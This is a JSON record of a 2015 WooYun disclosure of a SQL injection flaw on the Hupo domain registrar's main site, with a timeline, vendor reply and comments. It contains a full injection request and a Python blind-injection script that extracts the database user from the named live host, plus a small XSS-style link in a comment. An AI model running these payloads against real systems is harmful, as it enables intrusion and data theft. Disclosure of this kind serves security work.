{"id": 65484, "wybug_id": "wooyun-2015-0134068", "wybug_title": "域名商安全之琥珀网主站SQL注入漏洞", "wybug_corp": "琥珀网", "wybug_author": "深度安全实验室", "wybug_date": "2015-08-14 11:21", "wybug_open_date": "2015-10-02 17:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-02：\t细节向公众公开  简要描述：  详细说明：  \nPOST /DO_RenewDomain.php HTTP/1.1Content-Length: 188Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://www.hupo.com:80/Cookie: PHPSESSID=f9brj2crqtot1s23iiihmgrau3Host: www.hupo.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*submit=&AvailDomains=1&btnAdd=%e6%b7%bb%e5%8a%a0%20>>&btnRemove=<<%20%e7%a7%bb%e9%99%a4&cmd=SelectDomain&domains=-1' OR length(user())=15 or 'x'=' &DomainsList=1&realCmd=RenewDomain&step=3\ndomains参数为真，user长度为15：\n\n为假：\n\n写个脚本跑跑：\n\n付脚本：\n#encoding=utf-8import httplibimport timeimport stringimport sysimport randomimport urllibheaders = {'Content-Type': 'application/x-www-form-urlencoded'}payloads = list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.')print 'Start to retrive MySQL User:\\n'user = ''for i in range(1, 16):    for payload in payloads:        print '.',        conn = httplib.HTTPConnection('www.hupo.com', timeout=60)\t\t        s = \"domains=-1' or ascii(mid(user()from(%s)for(1)))=%s or 'x'='\"% (i, ord(payload))                conn.request(method='POST',                     url='/DO_RenewDomain.php',                     body='submit=&AvailDomains=1&btnAdd=%e6%b7%bb%e5%8a%a0%20>>&btnRemove=<<%20%e7%a7%bb%e9%99%a4&cmd=SelectDomain&DomainsList=1&realCmd=RenewDomain&step=3&' + s,                     headers=headers)        html_doc = conn.getresponse().read().decode('utf-8')        conn.close()        #print html_doc                if html_doc.find(u'2015-08-29') > 0:            user += payload            sys.stdout.write('\\r[In Progress]' + user)            sys.stdout.flush()            breakprint '[Done]MySQL user is %s' % user\n   漏洞证明：     修复方案：  我看给分一般，就这样吧。。。   版权声明：转载请注明来源 深度安全实验室@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-08-18 17:27 厂商回复： 漏洞已修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-18 17:36 |    \t\tDloveJ \t\t\t( 普通白帽子  |\t\t\t        Rank:1107 漏洞数:200        | <a href=javascrip:alert('xss')>s</a> 点...)\t\t \n  厂商好屌啊。。主站注入给5rank???洞主，，哎。。    \n     2015-08-19 10:51 |    \t\t深度安全实验室 \t\t\t( 核心白帽子 |\t\t\t        Rank:2075 漏洞数:333        )\t\t \n  @DloveJ 啥都不说了 说多了 都是眼泪    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}